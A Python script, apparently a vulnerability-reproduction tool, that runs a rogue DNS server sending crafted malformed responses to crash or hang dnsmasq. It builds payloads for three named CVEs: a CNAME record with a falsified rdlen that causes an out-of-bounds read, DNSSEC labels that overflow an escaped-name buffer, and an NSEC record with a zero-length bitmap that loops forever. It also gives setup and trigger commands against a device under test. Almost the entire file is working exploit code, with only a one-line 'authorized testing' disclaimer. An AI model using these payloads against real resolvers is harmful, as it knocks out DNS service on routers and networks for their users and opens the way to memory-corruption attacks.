#!/usr/bin/env python3
"""
Malicious DNS Server for dnsmasq CVE-2026 Reproduction

This script runs a DNS server that responds with crafted malformed packets
to trigger specific CVEs in dnsmasq when it forwards queries to us.

SETUP:
  1. Run this server on your test host (e.g., 192.168.1.100)
  2. Configure the DUT's dnsmasq to use this host as upstream DNS:
     On DUT: echo "server=192.168.1.100" >> /etc/dnsmasq.conf
             Or: echo "nameserver 192.168.1.100" > /tmp/resolv.conf.auto
     Then restart dnsmasq: killall dnsmasq; /etc/init.d/service_dhcp_server/dhcp_server-restart.sh
  3. From any client behind the DUT, do: nslookup crash-5172.evil.test 192.168.1.1
  4. DUT's dnsmasq forwards to us, we respond with exploit payload, dnsmasq crashes

IMPORTANT: For authorized security testing only.

Usage:
  python3 malicious_dns_server.py [--port 53] [--cve CVE-2026-5172]
  (requires root for port 53, or use --port 5353 and configure DUT accordingly)
"""

import argparse
import socket
import struct
import sys
import threading
import time

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BOLD = "\033[1m"


def encode_name(name):
    parts = name.split(".")
    r = b""
    for p in parts:
        r += bytes([len(p)]) + p.encode()
    return r + b"\x00"


def parse_query(data):
    """Parse incoming DNS query, return (txid, qname, qtype, qclass)."""
    if len(data) < 12:
        return None
    txid = struct.unpack("!H", data[0:2])[0]
    flags = struct.unpack("!H", data[2:4])[0]
    qdcount = struct.unpack("!H", data[4:6])[0]

    # Parse question
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        offset += 1
        if length == 0:
            break
        if offset + length > len(data):
            return None
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length
    qname = ".".join(labels)

    if offset + 4 > len(data):
        return None
    qtype = struct.unpack("!H", data[offset:offset + 2])[0]
    qclass = struct.unpack("!H", data[offset + 2:offset + 4])[0]

    return txid, qname, qtype, qclass


def build_response_cve_5172(txid, qname, qtype, qclass):
    """
    CVE-2026-5172: Falsified rdlen in DNS response.

    Build a response with a CNAME record where rdlen is declared as 4 bytes
    but the actual CNAME target encoded data is much longer. When dnsmasq
    calls extract_name() on this record, p1 advances past endrr, causing
    the remaining-bytes calculation to underflow → massive OOB read → crash.
    """
    # Response header: QR=1, AA=1, RD=1, RA=1, NOERROR
    header = struct.pack("!HHHHHH", txid, 0x8580, 1, 2, 0, 0)

    # Question section (echo back)
    question = encode_name(qname) + struct.pack("!HH", qtype, qclass)

    # Answer 1: CNAME with falsified rdlen
    # Use pointer to question name (offset 12)
    ans1_name = struct.pack("!H", 0xC00C)
    ans1_type_class = struct.pack("!HH", 5, 1)  # CNAME, IN
    ans1_ttl = struct.pack("!I", 300)
    # The CNAME target — a long domain name
    cname_target = encode_name("long.cname.target.that.will.overflow.rdlen.boundary.evil.test")
    # DECLARE rdlen as only 4 bytes (way less than actual cname_target length)
    # This makes endrr = p + 4, but extract_name will advance p far past that
    ans1_rdlen = struct.pack("!H", 4)
    ans1 = ans1_name + ans1_type_class + ans1_ttl + ans1_rdlen + cname_target

    # Answer 2: A record for the CNAME target (so dnsmasq tries to process it)
    ans2_name = encode_name("long.cname.target.that.will.overflow.rdlen.boundary.evil.test")
    ans2_type_class = struct.pack("!HH", 1, 1)  # A, IN
    ans2_ttl = struct.pack("!I", 300)
    ans2_rdlen = struct.pack("!H", 4)
    ans2_rdata = socket.inet_aton("6.6.6.6")
    ans2 = ans2_name + ans2_type_class + ans2_ttl + ans2_rdlen + ans2_rdata

    return header + question + ans1 + ans2


def build_response_cve_2291(txid, qname, qtype, qclass):
    """
    CVE-2026-2291: Heap buffer overflow in extract_name() via DNSSEC escape.

    NOTE: Only works if target has HAVE_DNSSEC compiled AND --dnssec enabled.
    Sends a response with a name containing bytes that trigger NAME_ESCAPE
    expansion (0x00, '.', NAME_ESCAPE char), causing the escaped representation
    to exceed the MAXDNAME buffer.

    For non-DNSSEC builds: this will NOT crash (Oak is safe from this CVE).
    """
    header = struct.pack("!HHHHHH", txid, 0x8580, 1, 1, 0, 0)
    question = encode_name(qname) + struct.pack("!HH", qtype, qclass)

    # Answer with a name containing special characters that trigger escape expansion
    # In DNSSEC mode: bytes 0x00, '.', and NAME_ESCAPE get 2-byte escaped
    # We use many labels with '.' embedded (which is byte 0x2E in the label data)
    # Each '.' in label data → \. escape (2 bytes) → doubles the internal size
    ans_name = struct.pack("!H", 0xC00C)
    ans_type_class = struct.pack("!HH", 5, 1)  # CNAME
    ans_ttl = struct.pack("!I", 300)

    # Build a CNAME target with labels full of bytes that get NAME_ESCAPE'd
    # NAME_ESCAPE is typically '/' (0x2F) in dnsmasq
    evil_labels = b""
    for i in range(15):
        # Fill with 0x2E (dot) and 0x00 (null) chars that get escaped
        label = bytes([0x2E] * 63)  # 63 dots per label
        evil_labels += bytes([len(label)]) + label
    evil_labels += b"\x00"

    ans_rdlen = struct.pack("!H", len(evil_labels))
    ans = ans_name + ans_type_class + ans_ttl + ans_rdlen + evil_labels

    return header + question + ans


def build_response_cve_4890(txid, qname, qtype, qclass):
    """
    CVE-2026-4890: NSEC bitmap infinite loop.

    Responds with an NSEC record that has bitmap_length=0, causing
    the bitmap parsing loop to never advance. dnsmasq hangs forever.

    NOTE: Only works if target has --dnssec enabled.
    """
    # Response: NXDOMAIN with authority section containing NSEC
    header = struct.pack("!HHHHHH", txid, 0x8503, 1, 0, 1, 0)  # QR=1, AA=1, NXDOMAIN

    question = encode_name(qname) + struct.pack("!HH", qtype, qclass)

    # Authority: NSEC record
    nsec_name = struct.pack("!H", 0xC00C)
    nsec_type_class = struct.pack("!HH", 47, 1)  # NSEC, IN
    nsec_ttl = struct.pack("!I", 300)

    # NSEC RDATA: next-domain + type bitmap
    next_domain = encode_name("z." + qname)
    # THE TRIGGER: type bitmap with window=0, bitmap_length=0
    evil_bitmap = struct.pack("BB", 0, 0)

    nsec_rdata = next_domain + evil_bitmap
    nsec_rdlen = struct.pack("!H", len(nsec_rdata))
    nsec_rr = nsec_name + nsec_type_class + nsec_ttl + nsec_rdlen + nsec_rdata

    return header + question + nsec_rr


def build_response_normal(txid, qname, qtype, qclass):
    """Normal A record response (for non-trigger queries)."""
    header = struct.pack("!HHHHHH", txid, 0x8580, 1, 1, 0, 0)
    question = encode_name(qname) + struct.pack("!HH", qtype, qclass)

    ans_name = struct.pack("!H", 0xC00C)
    ans_type_class = struct.pack("!HH", 1, 1)
    ans_ttl = struct.pack("!I", 60)
    ans_rdlen = struct.pack("!H", 4)
    ans_rdata = socket.inet_aton("127.0.0.2")

    return header + question + ans_name + ans_type_class + ans_ttl + ans_rdlen + ans_rdata


# Trigger domains → CVE mapping
TRIGGER_MAP = {
    "crash-5172": "CVE-2026-5172",
    "crash-2291": "CVE-2026-2291",
    "crash-4890": "CVE-2026-4890",
}


def handle_query(data, addr, sock, active_cves):
    """Process a DNS query and send appropriate malicious response."""
    parsed = parse_query(data)
    if not parsed:
        return

    txid, qname, qtype, qclass = parsed
    qname_lower = qname.lower()

    # Determine which exploit to send based on query domain
    response = None
    triggered_cve = None

    for trigger, cve in TRIGGER_MAP.items():
        if trigger in qname_lower and cve in active_cves:
            triggered_cve = cve
            break

    if triggered_cve == "CVE-2026-5172":
        response = build_response_cve_5172(txid, qname, qtype, qclass)
        print(f"  {RED}[EXPLOIT]{RESET} {addr[0]}:{addr[1]} → {qname} → Sending CVE-2026-5172 (falsified rdlen)")
    elif triggered_cve == "CVE-2026-2291":
        response = build_response_cve_2291(txid, qname, qtype, qclass)
        print(f"  {RED}[EXPLOIT]{RESET} {addr[0]}:{addr[1]} → {qname} → Sending CVE-2026-2291 (oversized escaped name)")
    elif triggered_cve == "CVE-2026-4890":
        response = build_response_cve_4890(txid, qname, qtype, qclass)
        print(f"  {RED}[EXPLOIT]{RESET} {addr[0]}:{addr[1]} → {qname} → Sending CVE-2026-4890 (NSEC infinite loop)")
    else:
        response = build_response_normal(txid, qname, qtype, qclass)
        print(f"  {GREEN}[NORMAL]{RESET} {addr[0]}:{addr[1]} → {qname} → Normal response")

    sock.sendto(response, addr)


def run_server(port, active_cves):
    """Run the malicious DNS server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("0.0.0.0", port))
    except PermissionError:
        print(f"{RED}Error: Cannot bind to port {port}. Run with sudo or use --port 5353{RESET}")
        sys.exit(1)
    except OSError as e:
        print(f"{RED}Error: {e}{RESET}")
        sys.exit(1)

    print(f"""
{BOLD}{'='*70}
  Malicious DNS Server for dnsmasq CVE-2026 Reproduction
{'='*70}{RESET}

  Listening on: 0.0.0.0:{port}
  Active CVEs:  {', '.join(active_cves)}

  {BOLD}SETUP on DUT:{RESET}
    1. SSH into the DUT and add this host as upstream DNS:
       echo "server=<THIS_HOST_IP>#{port}" >> /tmp/dnsmasq.conf
       OR: set nameserver in /tmp/resolv.conf.auto
       Then: killall -HUP dnsmasq   (or restart dnsmasq)

    2. Monitor DUT for crash:
       tail -f /var/log/messages* &
       while true; do pidof dnsmasq > /dev/null || echo "CRASHED"; sleep 1; done

  {BOLD}TRIGGER from any client behind DUT:{RESET}
    nslookup crash-5172.evil.test 192.168.1.1    ← triggers CVE-2026-5172
    nslookup crash-2291.evil.test 192.168.1.1    ← triggers CVE-2026-2291 (DNSSEC only)
    nslookup crash-4890.evil.test 192.168.1.1    ← triggers CVE-2026-4890 (DNSSEC only)

  {BOLD}TRIGGER directly from this host:{RESET}
    dig @192.168.1.1 crash-5172.evil.test
    dig @192.168.1.1 crash-2291.evil.test
    dig @192.168.1.1 crash-4890.evil.test

  Waiting for queries...
{'─'*70}
""")

    try:
        while True:
            data, addr = sock.recvfrom(4096)
            handle_query(data, addr, sock, active_cves)
    except KeyboardInterrupt:
        print(f"\n{BOLD}Server stopped.{RESET}")
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="Malicious DNS server for dnsmasq CVE-2026 reproduction"
    )
    parser.add_argument("--port", "-p", type=int, default=53,
                        help="Port to listen on (default: 53, use 5353 without root)")
    parser.add_argument("--cve", action="append", default=None,
                        help="CVE(s) to activate (default: all). Can specify multiple.")

    args = parser.parse_args()

    if args.cve:
        active_cves = [c.upper() for c in args.cve]
    else:
        active_cves = ["CVE-2026-5172", "CVE-2026-2291", "CVE-2026-4890"]

    run_server(args.port, active_cves)


if __name__ == "__main__":
    main()
